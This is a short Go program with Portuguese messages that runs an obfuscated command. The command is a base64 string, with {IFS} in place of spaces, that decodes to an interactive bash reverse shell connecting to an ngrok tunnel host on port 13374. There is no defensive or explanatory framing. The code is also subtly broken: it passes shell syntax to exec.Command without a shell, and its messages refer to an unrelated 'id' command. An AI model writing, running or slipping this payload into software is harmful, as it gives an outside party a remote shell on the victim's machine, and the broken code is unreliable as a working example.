package main

import (
        "fmt"
        "os/exec"
)

func main() {
        fmt.Println("Vivo!")
        cmd := exec.Command("echo{IFS}ZWNobyBiYXNoIC1pID4mIC9kZXYvdGNwLzAudGNwLnNhLm5ncm9rLmlvOjEzMzc0IDA+JjEK|base64{IFS}-d")                                                                                                                   
        output, err := cmd.Output()
        if err != nil {
            fmt.Println("Erro ao executar o comando id:", err)
        } else {
            fmt.Println("Saída do comando id:", string(output))
        }
}
